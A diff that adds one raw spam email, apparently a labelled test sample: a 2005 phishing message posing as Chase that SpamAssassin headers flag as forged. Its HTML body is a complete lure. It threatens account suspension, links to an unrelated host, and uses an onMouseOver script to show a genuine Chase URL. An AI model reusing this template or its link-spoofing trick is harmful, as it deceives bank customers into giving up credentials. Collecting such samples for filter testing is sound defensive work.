@@ -1,0 +1,123 @@
+Return-Path: <service@chase.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+	by naughty.example.com (Postfix) with ESMTP
+	id 4B912537036; Sat,  3 Dec 2005 23:30:59 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+	by mail2.example.com (Postfix) with ESMTP id D5A7B6FA2E0;
+	Sat,  3 Dec 2005 23:30:53 -0500 (EST)
+Received: from 192.168.1.10 (mail.kezu.com.au [220.245.89.129])
+	by mail2.example.com (Postfix) with SMTP;
+	Sat,  3 Dec 2005 23:30:53 -0500 (EST)
+Received: from 194.20.168.192 by ; Sun, 04 Dec 2005 00:32:15 -0500
+Message-ID: <ILLPQAVLEOWCUMUNIANP@aol.com>
+From: "service@chase.com" <service@chase.com>
+Reply-To: "service@chase.com" <service@chase.com>
+To: madonna-owner@example.com, nobody@example.com,
+	faxlist-digest@example.com
+Subject: SECURITY NOTICE : CHANGE YOUR PASSWORD
+Date: Sun, 04 Dec 2005 01:34:15 -0400
+X-Mailer: Microsoft Outlook Express 5.00.2615.200
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--373887325340461"
+X-Priority: 1
+X-MSMail-Priority: High
+X-Spam-Flag: YES
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ********************
+X-Spam-Status: Yes, score=20.7 required=5.0 tests=FORGED_MUA_OUTLOOK,
+	FORGED_OUTLOOK_HTML,FORGED_OUTLOOK_TAGS,HTML_IMAGE_ONLY_24,
+	HTML_MESSAGE,MIME_BOUND_DD_DIGITS,MIME_HTML_ONLY,MIME_HTML_ONLY_MULTI,
+	MISSING_MIMEOLE,MPART_ALT_DIFF,MSGID_SPAM_CAPS,RCVD_IN_BL_SPAMCOP_NET,
+	RCVD_IN_XBL,SUBJ_ALL_CAPS autolearn=spam version=3.0.2
+X-Spam-Report: 
+	*  4.1 MIME_BOUND_DD_DIGITS Spam tool pattern in MIME boundary
+	*  3.8 MSGID_SPAM_CAPS Spam tool Message-Id: (caps variant)
+	*  0.7 SUBJ_ALL_CAPS Subject is all capitals
+	*  0.5 HTML_IMAGE_ONLY_24 BODY: HTML: images with 2000-2400 bytes of words
+	*  0.0 HTML_MESSAGE BODY: HTML included in message
+	*  0.1 MPART_ALT_DIFF BODY: HTML and text parts are different
+	*  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+	*  1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+	*      [Blocked - see <http://www.spamcop.net/bl.shtml?220.245.89.129>]
+	*  3.1 RCVD_IN_XBL RBL: Received via a relay in Spamhaus XBL
+	*      [220.245.89.129 listed in sbl-xbl.spamhaus.org]
+	*  0.6 FORGED_OUTLOOK_HTML Outlook can't send HTML message only
+	*  0.1 FORGED_OUTLOOK_TAGS Outlook can't send HTML in this format
+	*  2.4 MIME_HTML_ONLY_MULTI Multipart message only has text/html MIME parts
+	*  0.0 MISSING_MIMEOLE Message has X-MSMail-Priority, but no X-MimeOLE
+	*  3.9 FORGED_MUA_OUTLOOK Forged mail pretending to be from MS Outlook
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 77
+
+----373887325340461
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+
+
+<html>
+<p>
+  <A target=3D"_blank"
+href=3D"http://zeus.east.utcluj.ro/.profile/index.php?prospect_nfpb=3Dtrue=
+portlet_change_1_actionOverrideFchaseonlineFchangeFverifyDetails_windowLab=
+el_portlet_change_pageLabel_page_change"    ><IMG
+src=3D"https://chaseonline.chase.com/content/ecpweb/sso/image/chaseNew.gif=
+"    border=3D0></A></p>
+  <BR>
+We recently have determined that different computers have logged onto your=
+ Online Banking account, and multiple
+password failures
+were present before the logons. We now need you to re-confirm your profile=
+ information to us. If this is not completed
+by <strong>December 7, 2005</strong>, we will be forced to suspend your 
+account indefinitely, as it may have been
+used for fraudulent purposes. We thank you for your cooperation in this ma=
+nner.</FONT>
+<p>To confirm your Online Profile records click here: 
+<p><br>
+  
+  <a
+href=3D"http://zeus.east.utcluj.ro/.profile/index.php?prospect_nfpb=3Dtrue=
+portlet_change_1_actionOverrideFchaseonlineFchangeFverifyDetails_windowLab=
+el_portlet_change_pageLabel_page_change"
+onMouseOver=3D"window.status=3D'https://chaseonline.chase.com/colappmgr/co=
+lportal/prospect?_nfpb=3Dtrue&_pageLabel=3Dpage_logonform';return true;"
+    onMouseOut=3D"window.status=3D' ';return
+true;">https://chaseonline.chase.com/colappmgr/colportal/prospect?_nfpb=3D=
+true&_pageLabel=3Dpage_logonform</a>
+      <br>
+      <br>
+<p><font size=3D"2" face=3D"Arial, Helvetica, sans-serif"></font><font
+color=3D"#000000" size=3D"2" face=3D"Arial, Helvetica, sans-serif"><BR>
+Thank you for your patience in this matter.</font><br>
+  <br>
+</p>
+<p><font color=3D"#000000" size=3D"2" face=3D"Arial, Helvetica, sans-serif=
+"> JPMorgan Chase &amp; Co. Customer Service</font><br>
+<font color=3D"#000000" size=3D"2" face=3D"Arial, Helvetica, sans-serif"><=
+/font></p>
+<p><font size=3D"2" face=3D"Arial, Helvetica, sans-serif"><font color=3D"#=
+999999" size=3D"1">Please do not reply to this e-mail
+as this is only a notification. Mail sent to this address cannot be answer=
+ed. </font></font></p>
+<p><font color=3D"#000000" size=3D"1" face=3D"Arial, Helvetica, sans-serif=
+"><font color=3D"black"><span style=3D"color:
+black;"></font>&copy; 2005 JPMorgan Chase &amp; Co.<br>
+</html>
+
+
+
+
+
+
+
+
+
+
+----373887325340461--
+
